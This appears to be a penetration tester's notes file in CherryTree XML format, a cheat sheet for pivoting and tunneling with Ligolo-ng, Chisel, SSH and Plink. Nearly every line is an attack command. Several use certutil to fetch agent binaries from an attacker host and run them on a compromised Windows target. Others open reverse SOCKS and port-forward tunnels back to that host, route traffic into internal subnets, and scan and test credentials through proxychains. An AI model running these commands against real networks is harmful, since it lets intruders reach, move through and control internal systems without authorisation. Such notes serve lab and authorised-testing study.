    <node name="07. Pivoting &amp; Tunneling" tags="" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
      <rich_text></rich_text>

      <node name="Ligolo-ng" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Setup local tunnel interface and start proxy listener
--------------------------------------------------
python3 -m http.server 80
# Host agent binaries for download
--------------------------------------------------
certutil -urlcache -split -f http://&lt;LHOST&gt;/agent.exe agent.exe
.\agent.exe -connect &lt;LHOST&gt;:11601 -ignore-cert
# Download and run agent on Windows target
--------------------------------------------------
./agent -connect &lt;LHOST&gt;:11601 -ignore-cert
# Run agent on Linux target
--------------------------------------------------
session
ifconfig
start
# Ligolo console: select session, map interfaces, start tunnel
--------------------------------------------------
sudo ip route add 10.10.10.0/24 dev ligolo
# Route internal subnet through Ligolo tunnel
--------------------------------------------------
listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
# Expose isolated internal target port back to attacker workspace
--------------------------------------------------
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
.\agent.exe -connect &lt;MS01_IP&gt;:11601 -ignore-cert
sudo ip route add 172.16.0.0/24 dev ligolo
# Establish nested multi-hop forwarding vectors over secondary subnets
--------------------------------------------------</rich_text>
      </node>

      <node name="Chisel" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>./chisel server -p 8888 --reverse
# Start Chisel server in reverse mode
--------------------------------------------------
.\chisel.exe client &lt;LHOST&gt;:8888 R:socks
# Establish reverse SOCKS tunnel from Windows target
--------------------------------------------------
proxychains nmap -sT -Pn 10.10.10.50
proxychains crackmapexec smb 10.10.10.50 -u user -p pass
# Scan internal target via proxychains
--------------------------------------------------
.\chisel.exe client &lt;LHOST&gt;:8888 R:3306:127.0.0.1:3306
# Forward specific isolated internal node port to attacker loopback
--------------------------------------------------</rich_text>
      </node>

      <node name="SSH Tunneling &amp; Plink" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>ssh -L 3389:10.10.10.50:3389 user@&lt;MS01_IP&gt;
# Local port forward for RDP access
--------------------------------------------------
xfreerdp /v:localhost:3389 /u:user /p:pass
# Connect to forwarded RDP port
--------------------------------------------------
ssh -D 1080 -N user@&lt;MS01_IP&gt;
proxychains nmap -sT -Pn 10.10.10.0/24
# Dynamic SOCKS proxy tunnel for full subnet scanning
--------------------------------------------------
ssh -R 4444:127.0.0.1:4444 attacker@&lt;LHOST&gt;
ssh -R 445:127.0.0.1:445 attacker@&lt;LHOST&gt;
# Reverse port forward from Windows target to attacker
--------------------------------------------------
certutil -urlcache -split -f http://&lt;LHOST&gt;/plink.exe plink.exe
cmd /c echo y | .\plink.exe -ssh -l root -pw &lt;SSH_PASS&gt; -R 127.0.0.1:4455:127.0.0.1:445 &lt;LHOST&gt;
# Download and run Plink for non-interactive automated reverse SSH tunneling
--------------------------------------------------</rich_text>
      </node>
